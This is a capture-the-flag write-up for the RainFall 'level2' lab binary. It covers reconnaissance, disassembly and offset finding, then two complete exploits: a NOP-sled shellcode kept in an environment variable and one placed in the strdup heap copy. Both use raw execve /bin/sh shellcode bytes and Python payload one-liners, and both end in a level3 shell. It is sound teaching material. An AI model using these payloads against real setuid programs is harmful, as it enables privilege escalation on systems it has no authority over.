# LEVEL 2 - Stack Buffer Overflow (ret2shellcode) 

> Vulnerability class: Stack Buffer Overflow - ret2shellcode
> Binary: ELF 32-bits, dynamically linked, not stripped
> Tools used: GDB, file

---

## Overview

The `p()` function contains two vulnerabilities: an unbounded `gets()` call into a stack buffer, and a `strdup()` call that copies user input onto the heap. The binary also includes a return address check that blocks classic stack redirection, forcing us to target memory regions outside the stack. We cover two independent exploitation paths.

---

## 1. Reconnaissance

```bash
   level2@RainFall:~$ file level2 
   level2: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x0b5bb6cdcf572505f066c42f7be2fde7c53dc8bc, not stripped
```
```bash 
   $ checksec --file level2 
   RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
   No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   level2
```

Key observations:

- setuid/setgid binary: successful exploitation escalates privileges
- not stripped: function names are preserved, simplifying static analysis
- dynamically linked: library functions resolved at runtime via PLT/GOT
- NX disabled: the stack and heap are executable, meaning injected shellcode can run directly
- ASLR off: addresses are fixed across runs, no need to leak or brute force memory layout
- No stack canary: the saved return address can be overwritten without triggering any detection
- No PIE: the binary is loaded at a fixed base address every time, making PLT/GOT addresses predictable

---

## 2. Static Analysis

### 2.1 the `p()` function

Disassembling `p()` reveals the core logic:
```asm
   0x080484ed <+25>:    call   0x80483c0 <gets@plt>      ; unbounded read into buffer
   0x080484f2 <+30>:    mov    0x4(%ebp),%eax            ; load return address
   0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:    mov    -0xc(%ebp),%eax     
   0x080484fb <+39>:    and    $0xb0000000,%eax          ; mask high bits
   0x08048500 <+44>:    cmp    $0xb0000000,%eax          ; check if return addr points to stack
   0x08048505 <+49>:    jne    0x8048527 <p+83>          ; if not stack continue, else calls exit()
   [...]
   0x08048535 <+97>:    mov    %eax,(%esp)
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>    ; copies input to heap
```

Two observations:
1. `gets()` writes into the buffer with no bounds check, classic stack overflow primitive.
2. The binary explicitly checks whether the overwritten return address points to the stack (`0xb0000000` prefix). If it does, the program prints the address and exits. This means direct ret2stack is blocked.

---

## 2.2 Identifying the buffer size / Offset calculation

Disassembly `p()` also gives us the stack layout directly:
```asm
   0x080484d7 <+3>:     sub    $0x68,%esp                ; reserves 88 bytes on the stack
   [...]
   0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax          ; buffer starts at ebp-0x4c (76 bytes below EBP)
   0x080484ea <+22>:    mov    %eax,(%esp)
   0x080484ed <+25>:    call   0x80483c0 <gets@plt>
```

Stack layout at the `gets()` call:
```txt
   [ 76 bytes buffer ][ 4 bytes saved EBP ][ 4 bytes saved EIP ]
```

Total bytes to reach saved EIP: `76 + 4 (saved EBP) = 80`.
Offset 80 is confirmed by testing:
```bash
   (gdb) run < <(python -c 'print "A" * 80')
   Starting program: /home/user/level2/level2 < <(python -c 'print "A" * 80')
   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

   Program received signal SIGSEGV, Segmentation fault.
   0xb7ea912f in ?? () from /lib/i386-linux-gnu/libc.so.6   ; EIP not yet fully overwritten
   
   [...]
   
   (gdb) run < <(python -c 'print "A" * 81')
   Starting program: /home/user/level2/level2 < <(python -c 'print "A" * 81')
   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

   Program received signal SIGSEGV, Segmentation fault.
   0x08040041 in ?? ()                                      ; EIP starts being overwritten at byte 81
```

## Vulnerability

Root cause: `gets()` performs no bounds checking, allowing writes over the saved return address (EIP).

Mitigation Bypass: The return address check at `p+44` compares the high bits of the overwritten EIP against `0xb0000000`. Any address in the stack range (`0xbf...`) is caught and rejected. We must redirect execution to a region outside the stack: the environment or the heap.


## 4. Solution 1 - ret2shellcode via Environment Variable

Since the stack is guarded, we inject shellcode into an environment variable (which lives at the top of the address space, above the stack guard range) and redirect EIP into it.


### 4.1 Inject shellcode into the environment

```bash
   level2@RainFall:~$ export PAYLOAD=$(python -c 'print "\x90" * 1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')
```

The NOP sled (`\x90 * 1000`) gives us a large landing zone before the shellcode.  
Shellcode source: [shell-storm.org #219](https://shell-storm.org/shellcode/files/shellcode-219.html)


### 4.2 Locate the environment variable in memory

The variable starts at `0xbffffb99`:
```bash
   (gdb) break main
   (gdb) run
   (gdb) x/2000s environ
   [...]
   0xbffffb99:      "PAYLOAD=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\"...
   [...]
```
The NOP sled begins 8 bytes later (after `PAYLOAD=`).
EXPLAIN WHY ADDRESSING IT DOESNT CHANGE DURING EXECUTION!!!!


### 4.3 Choose a target address within the NOP sled

```bash
   (gdb) x/200gx 0xbffffb99
   0xbffffb99:     0x3d44414f4c594150      0x9090909090909090
   0xbffffba9:     0x9090909090909090      0x9090909090909090
   0xbffffbb9:     0x9090909090909090      0x9090909090909090
   0xbffffbc9:     0x9090909090909090      0x9090909090909090
   0xbffffbd9:     0x9090909090909090      0x9090909090909090
   0xbffffbe9:     0x9090909090909090      0x9090909090909090
   0xbffffbf9:     0x9090909090909090      0x9090909090909090
   0xbffffc09:     0x9090909090909090      0x9090909090909090
   [...]
```

We aim for the middle of the sled: `0xbffffd39`.

### 4.4 Build and execute the payload

The payload is built as followed:
```txt
   [ 80 bytes padding ] + [ ret addr: 0x0804854b ] + [ NOP sled addr: 0xbffffd39 ]
   ^ = Offset             ^ main ret                 ^ target address
```
We use a two-hop, the ret of main as a trampoline then bounce to the NOP sled.  


```bash
   level2@RainFall:~$ (python -c 'print "A" * 80 + "\x08\x04\x85\x4b"[::-1] + "\xbf\xff\xfd\x39"[::-1]'; cat) | ./level2
   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKAAAAAAAAAAAAK9���
   $ whoami
   level3
   $ cat /home/user/level3/.pass
   XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

```

## 5. Solution 2 - Heap Exploitation (strdup)

`strdup()` copies the user input onto the heap (`0x0804a...` range), which is not caught by the stack guard check. We inject shellcode directly into the buffer and overwrite EIP with the heap address where `strdup()` placed it.

### 5.1 Locate the heap copy

After overflow, `strdup()` copies the full input to the heap. The heap base on this binary is at `0x0804a008`. We find where `strdup` copy is by checking its return value, in EAX register:
```
   (gdb) b strdup
   (gdb) run
   [...]
   Breakpoint 1, 0xb7ea8d30 in strdup () from /lib/i386-linux-gnu/libc.so.6
   (gdb) n
   (gdb) info registers eax
   eax            0x804a008        134520840
```

### 5.2 Build the payload

```txt
   [ 33 bytes shellcode ] + [ padding to 80 = 47 ] + [ heap address ]
```

```bash
   $ (python -c 'print "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "A" * 47 + "\x08\xa0\x04\x08"'; cat) | ./level2
   $ whoami
   level3
   $ cat /home/user/level3/.pass
   XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

The heap address `0x0804a008` passes the stack guard check (`0x0804... & 0xb0000000 = 0x00000000 ≠ 0xb0000000`).

---


## 6. Key Takeaways

| Concept | Detail |
|---|---|
| `gets()` is unsafe | No bounds check, allows overflow of any adjacent stack data |
| Stack guard bypass | Comparing EIP high bits is a weak mitigation, env vars and heap are unaffected |
| ret2shellcode | Shellcode injected into env vars lands outside the guarded stack range |
| Heap as shellcode carrier | `strdup()` copies input to the heap, a writable, executable region on this binary |
| NOP sled | Pads the shellcode landing zone, tolerating minor address variation between GDB and runtime |
